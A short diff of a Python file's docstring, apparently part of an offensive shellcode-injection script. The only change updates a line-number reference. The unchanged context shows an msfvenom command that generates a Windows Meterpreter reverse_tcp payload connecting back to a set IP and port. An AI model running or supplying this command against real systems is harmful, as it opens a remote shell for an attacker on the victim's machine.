@@ -3,7 +3,7 @@
 """
 Generate ShellCode
 
-Generate shellcode using MSVenom and replace line 13
+Generate shellcode using MSVenom and replace line 14
 
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.151 LPORT=4444 -e none -f python
 
